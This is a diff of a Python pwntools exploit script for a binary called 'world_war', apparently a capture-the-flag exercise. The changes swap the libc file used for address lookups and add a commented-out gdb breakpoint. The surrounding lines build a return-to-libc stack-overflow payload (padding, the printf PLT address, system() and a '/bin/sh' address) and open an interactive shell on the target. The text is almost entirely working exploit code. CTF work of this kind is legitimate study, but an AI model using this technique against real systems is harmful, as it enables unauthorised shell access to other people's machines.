@@ -4,7 +4,7 @@ def exploit():
     binary = ELF("world_war")
     #p = remote("127.0.0.1", 8888)
     p = process("./world_war")
-    hailibc = ELF("libc6_2.23-0ubuntu10_i386.so")     
+    hailibc = ELF("/lib/i386-linux-gnu/libc-2.27.so")     
 
     padding = 72
     printf_plt = p32(binary.symbols["plt.printf"])
@@ -33,7 +33,11 @@ def exploit():
     payload += p32(system_libc)
     payload += "JUNK"
     payload += p32(binsh_libc)
-    
+    #gdb.attach(p, '''
+    #            b *main+153
+    #            c
+    #            ''')
+
     p.sendline(payload)
     p.interactive()
 
